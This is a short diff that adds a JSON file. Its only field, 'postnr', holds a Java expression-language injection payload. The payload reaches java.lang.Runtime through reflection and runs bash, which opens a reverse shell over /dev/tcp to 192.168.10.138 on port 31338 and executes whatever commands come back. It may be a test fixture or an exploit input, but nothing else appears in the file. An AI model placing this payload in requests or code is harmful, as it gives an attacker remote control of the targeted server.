@@ -1,0 +1,3 @@
+{
+  "postnr": "pn=${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec([\"bash\", \"-c\", \"exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done\"].toArray(\"\".split(\",\"))).waitFor()}"
+}
